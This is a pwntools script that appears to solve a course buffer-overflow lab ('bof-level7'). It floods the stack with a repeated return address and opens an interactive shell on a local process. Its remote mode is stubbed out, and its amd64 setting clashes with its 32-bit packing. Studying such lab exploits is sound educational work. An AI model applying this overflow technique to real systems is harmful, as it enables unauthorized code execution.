#!/usr/bin/env python

from pwn import *  # pylint: disable=unused-wildcard-import
import os, sys

context(arch="amd64")

HOST="asdf"
PORT=12345
REMOTE_LIBC="libc.so.6"

BINARY="./bof-level7"
LOCAL_LIBC=os.environ['LIBC'] if 'LIBC' in os.environ else "/lib/x86_64-linux-gnu/libc.so.6"

if "remote" in sys.argv:
    #p = remote(HOST, PORT)
    BINARY="/home/labs/week2/bof-level7/bof-level7"
    try:
        libc = ELF(REMOTE_LIBC)
    except:
        pass


p = process(BINARY)
#libc = ELF(LOCAL_LIBC)

elf = ELF(BINARY)
rop = ROP(elf)

if "gdb" in sys.argv:
    context.terminal = ['tmux', 'splitw', '-h']  # pylint: disable=assigning-non-slot
    gdb.attach(p, "b *receive_input+98")  # pylint: disable=undefined-variable

########################################################


def exploit(byte_to_try):
    #p = process(BINARY)
    log.info("wuddup")

    shell = p32(0x80484fb)

    #p.sendline("aaa" + shell*(132/len(shell)) + "a" + byte_to_try)
    p.sendline(shell*(136/len(shell)) + "\x00")
    p.interactive()


########################################################

if __name__ == "__main__":
#    for x in range(0x100):
#        exploit(str(x))
    exploit("\x00")
